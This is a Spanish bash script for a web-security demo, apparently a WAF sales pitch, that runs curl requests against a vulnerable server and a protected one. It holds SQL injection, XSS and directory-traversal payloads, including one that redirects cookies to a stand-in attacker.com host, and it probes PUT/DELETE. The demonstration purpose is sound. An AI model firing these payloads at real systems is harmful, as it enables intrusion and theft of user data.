#!/bin/bash

# ========================================
# DEMO MANUAL DE VULNERABILIDADES
# ========================================

# URLs
VULNERABLE_URL="http://150.136.229.38"
PROTECTED_URL="http://132.226.48.154"

# Colores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m' # No Color

echo -e "${BLUE}"
echo "██████╗ ███████╗███╗   ███╗ ██████╗     ███╗   ███╗ █████╗ ███╗   ██╗██╗   ██╗ █████╗ ██╗     "
echo "██╔══██╗██╔════╝████╗ ████║██╔═══██╗    ████╗ ████║██╔══██╗████╗  ██║██║   ██║██╔══██╗██║     "
echo "██║  ██║█████╗  ██╔████╔██║██║   ██║    ██╔████╔██║███████║██╔██╗ ██║██║   ██║███████║██║     "
echo "██║  ██║██╔══╝  ██║╚██╔╝██║██║   ██║    ██║╚██╔╝██║██╔══██║██║╚██╗██║██║   ██║██╔══██║██║     "
echo "██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝    ██║ ╚═╝ ██║██║  ██║██║ ╚████║╚██████╔╝██║  ██║███████╗"
echo "╚═════╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝"
echo -e "${NC}"

function pause_demo() {
    echo -e "${PURPLE}[Presiona ENTER para continuar...]${NC}"
    read
}

function show_command() {
    echo -e "${YELLOW}Comando:${NC} $1"
    echo ""
}

function show_result() {
    echo -e "${GREEN}✅ Resultado:${NC} $1"
    echo ""
}

function show_vulnerability() {
    echo -e "${RED}🚨 VULNERABILIDAD:${NC} $1"
    echo ""
}

echo -e "${BLUE}🎯 DEMO MANUAL DE VULNERABILIDADES${NC}"
echo -e "${BLUE}URL Vulnerable: ${VULNERABLE_URL}${NC}"
echo -e "${BLUE}URL Protegida: ${PROTECTED_URL}${NC}"
echo ""

# ========================================
# 1. RECONOCIMIENTO
# ========================================
echo -e "${BLUE}================================================${NC}"
echo -e "${BLUE}🕵️ FASE 1: RECONOCIMIENTO${NC}"
echo -e "${BLUE}================================================${NC}"

echo -e "${YELLOW}📡 Analizando headers del servidor vulnerable...${NC}"
show_command "curl -I $VULNERABLE_URL"
pause_demo

curl -I $VULNERABLE_URL
echo ""
show_vulnerability "Headers de seguridad ausentes (X-Frame-Options, CSP, etc.)"
pause_demo

# ========================================
# 2. SQL INJECTION
# ========================================
echo -e "${BLUE}================================================${NC}"
echo -e "${BLUE}💉 FASE 2: SQL INJECTION${NC}"
echo -e "${BLUE}================================================${NC}"

echo -e "${YELLOW}🔍 Test básico con comilla simple...${NC}"
show_command "curl \"$VULNERABLE_URL/?demo=sql&user_id=1'\""
pause_demo

RESULT=$(curl -s "$VULNERABLE_URL/?demo=sql&user_id=1'" | grep -o "PATRÓN DE SQL INJECTION DETECTADO")
if [ "$RESULT" ]; then
    show_vulnerability "SQL Injection detectado - La aplicación es vulnerable"
else
    echo -e "${GREEN}✅ No se detectó vulnerabilidad${NC}"
fi
pause_demo

echo -e "${YELLOW}🚨 Bypass de autenticación...${NC}"
show_command "curl \"$VULNERABLE_URL/?demo=sql&user_id=1%27%20OR%20%271%27=%271\""
pause_demo

RESULT=$(curl -s "$VULNERABLE_URL/?demo=sql&user_id=1%27%20OR%20%271%27=%271" | grep -o "OR '1'='1'")
if [ "$RESULT" ]; then
    show_vulnerability "Bypass exitoso - Acceso a toda la base de datos"
else
    echo -e "${GREEN}✅ Ataque bloqueado${NC}"
fi
pause_demo

# ========================================
# 3. XSS
# ========================================
echo -e "${BLUE}================================================${NC}"
echo -e "${BLUE}⚡ FASE 3: CROSS-SITE SCRIPTING (XSS)${NC}"
echo -e "${BLUE}================================================${NC}"

echo -e "${YELLOW}🎭 Test XSS básico...${NC}"
show_command "curl \"$VULNERABLE_URL/?demo=xss&comment=%3Cscript%3Ealert('XSS')%3C/script%3E\""
pause_demo

RESULT=$(curl -s "$VULNERABLE_URL/?demo=xss&comment=%3Cscript%3Ealert('XSS')%3C/script%3E" | grep -o "PATRÓN XSS DETECTADO")
if [ "$RESULT" ]; then
    show_vulnerability "XSS detectado - Scripts maliciosos pueden ejecutarse"
else
    echo -e "${GREEN}✅ Script bloqueado${NC}"
fi
pause_demo

echo -e "${YELLOW}💀 XSS avanzado (robo de cookies)...${NC}"
show_command "curl \"$VULNERABLE_URL/?demo=xss&comment=%3Cimg%20src=x%20onerror=document.location='http://attacker.com/'%3E\""
pause_demo

RESULT=$(curl -s "$VULNERABLE_URL/?demo=xss&comment=%3Cimg%20src=x%20onerror=document.location='http://attacker.com/'%3E" | grep -o "img src")
if [ "$RESULT" ]; then
    show_vulnerability "Payload XSS avanzado ejecutado - Posible robo de datos"
else
    echo -e "${GREEN}✅ Payload bloqueado${NC}"
fi
pause_demo

# ========================================
# 4. DIRECTORY TRAVERSAL
# ========================================
echo -e "${BLUE}================================================${NC}"
echo -e "${BLUE}📁 FASE 4: DIRECTORY TRAVERSAL${NC}"
echo -e "${BLUE}================================================${NC}"

echo -e "${YELLOW}🔍 Intentando acceder a /etc/passwd...${NC}"
show_command "curl \"$VULNERABLE_URL/?demo=path&file=../../etc/passwd\""
pause_demo

RESULT=$(curl -s "$VULNERABLE_URL/?demo=path&file=../../etc/passwd" | grep -o "DIRECTORY TRAVERSAL DETECTADO")
if [ "$RESULT" ]; then
    show_vulnerability "Directory Traversal detectado - Archivos sensibles accesibles"
else
    echo -e "${GREEN}✅ Acceso bloqueado${NC}"
fi
pause_demo

# ========================================
# 5. MÉTODOS HTTP PELIGROSOS
# ========================================
echo -e "${BLUE}================================================${NC}"
echo -e "${BLUE}🔧 FASE 5: MÉTODOS HTTP PELIGROSOS${NC}"
echo -e "${BLUE}================================================${NC}"

echo -e "${YELLOW}🚨 Verificando método PUT...${NC}"
show_command "curl -X PUT $VULNERABLE_URL -v 2>&1 | grep 'HTTP/'"
pause_demo

PUT_RESULT=$(curl -X PUT $VULNERABLE_URL -v 2>&1 | grep -o "HTTP/1.1 200")
if [ "$PUT_RESULT" ]; then
    show_vulnerability "Método PUT permitido - Riesgo de subida de archivos"
else
    echo -e "${GREEN}✅ Método PUT bloqueado${NC}"
fi

echo -e "${YELLOW}🚨 Verificando método DELETE...${NC}"
show_command "curl -X DELETE $VULNERABLE_URL -v 2>&1 | grep 'HTTP/'"
pause_demo

DELETE_RESULT=$(curl -X DELETE $VULNERABLE_URL -v 2>&1 | grep -o "HTTP/1.1 200")
if [ "$DELETE_RESULT" ]; then
    show_vulnerability "Método DELETE permitido - Riesgo de eliminación de archivos"
else
    echo -e "${GREEN}✅ Método DELETE bloqueado${NC}"
fi
pause_demo

# ========================================
# 6. COMPARACIÓN CON WAF
# ========================================
echo -e "${BLUE}================================================${NC}"
echo -e "${BLUE}🛡️ FASE 6: COMPARACIÓN CON WAF${NC}"
echo -e "${BLUE}================================================${NC}"

echo -e "${YELLOW}🔍 Misma SQL Injection en servidor protegido...${NC}"
show_command "curl \"$PROTECTED_URL/?demo=sql&user_id=1%27%20OR%20%271%27=%271\""
pause_demo

PROTECTED_RESULT=$(curl -s "$PROTECTED_URL/?demo=sql&user_id=1%27%20OR%20%271%27=%271" | grep -o "ATAQUE BLOQUEADO")
if [ "$PROTECTED_RESULT" ]; then
    show_result "WAF bloqueó el ataque exitosamente"
else
    echo -e "${RED}❌ Ataque no bloqueado${NC}"
fi
pause_demo

# ========================================
# RESUMEN
# ========================================
echo -e "${BLUE}================================================${NC}"
echo -e "${BLUE}📊 RESUMEN DE LA DEMO${NC}"
echo -e "${BLUE}================================================${NC}"

echo -e "${RED}🚨 VULNERABILIDADES ENCONTRADAS:${NC}"
echo -e "${RED}   • SQL Injection (CRÍTICO)${NC}"
echo -e "${RED}   • Cross-Site Scripting (CRÍTICO)${NC}"
echo -e "${RED}   • Directory Traversal (ALTO)${NC}"
echo -e "${RED}   • Headers de seguridad ausentes (MEDIO)${NC}"
echo -e "${RED}   • Métodos HTTP peligrosos (MEDIO)${NC}"
echo ""

echo -e "${YELLOW}💰 IMPACTO COMERCIAL:${NC}"
echo -e "${YELLOW}   • Costo promedio de violación: \$4.45M USD${NC}"
echo -e "${YELLOW}   • Tiempo de detección: 287 días${NC}"
echo -e "${YELLOW}   • Pérdida de confianza: 65%${NC}"
echo ""

echo -e "${GREEN}✅ SOLUCIÓN RECOMENDADA:${NC}"
echo -e "${GREEN}   • Oracle WAF - Bloquea 85% de ataques${NC}"
echo -e "${GREEN}   • Oracle Cloud Guard - Monitoreo 24/7${NC}"
echo -e "${GREEN}   • Headers de seguridad configurados${NC}"
echo ""

echo -e "${BLUE}🎯 ¡Demo completada exitosamente!${NC}"